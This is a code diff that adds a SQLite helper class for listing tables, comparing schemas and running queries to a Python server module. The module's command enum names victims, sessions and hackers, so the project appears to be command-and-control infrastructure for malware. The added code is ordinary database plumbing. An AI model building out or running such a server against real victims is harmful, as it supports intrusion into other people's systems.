@@ -3,6 +3,7 @@ import binascii
 from enum import Enum
 import json
 import uuid
+import sqlite3 as sq
 from datetime import datetime
 from http import HTTPStatus
 from pathlib import Path
@@ -30,6 +31,66 @@ class ServerCommand(str, Enum):
     list_victims = "list_victims"
     exit_session = "exit_session"
     delete_hacker = "delete_hacker"
+
+
+class DatabaseUtils:
+    def __init__(self, db_connection: sq.Connection):
+        self.db_connection = db_connection
+
+    def get_db_tables(self) -> list[str]:
+        """Get the tables of this database as a list"""
+        db_cursor = self.db_connection.cursor()
+        # Get all the tables
+        db_cursor.execute("SELECT tbl_name, sql FROM sqlite_master")
+        objects: list[str] = db_cursor.fetchall()
+        return [
+            object[0]
+            for object in objects
+            if object[1].lower().startswith("create table")
+        ]
+
+    def strip_schema(self, schema: str) -> str:
+        """Get rid of new lines and strip a schema to make it ready for comparison also remove the `IF NOT EXISTS` that will ruin the string validation."""
+
+        # remove the `IF NOT EXISTS` and `;` since it doesn't exist in the sqlite_schema table
+        schema = schema.replace("IF NOT EXISTS ", "")
+        schema = schema.replace(";", "")
+
+        schema_lst = schema.splitlines()
+        schema_lst = [schema.strip() for schema in schema_lst]
+
+        return "".join(schema_lst)
+
+    def query(self, query: str, __params=None, raise_for_error=False):
+        """Return all results that return from a database query provided by `query` and return None when`sqlite3.OperationalError` occurs"""
+        # Let's execute and handle the query
+        try:
+            cur = self.db_connection.cursor()
+            cur.execute(query, __params if __params is not None else ())
+            return cur.fetchall()
+        except sq.Error as e:
+            if raise_for_error:
+                raise sq.Error(e)
+            return None
+
+    def execute(
+        self,
+        statement: str,
+        __params=None,
+        raise_for_error=False,
+    ) -> Optional[sq.Cursor]:
+        """Execute the `statement` on the database and return `None` if `sqlite3.OperationalError` get's raised and the cursor if successful."""
+        try:
+            conn = self.db_connection.cursor()
+            res_cur = conn.execute(statement, __params if __params is not None else ())
+            self.db_connection.commit()
+            return res_cur
+        except sq.Error as e:
+            if raise_for_error:
+                raise sq.Error(e)
+            log("debug", f"SQLERROR: {e}")
+            log("debug", f"from: `{statement}`")
+            return None
 
 
 class HandlerResponse:
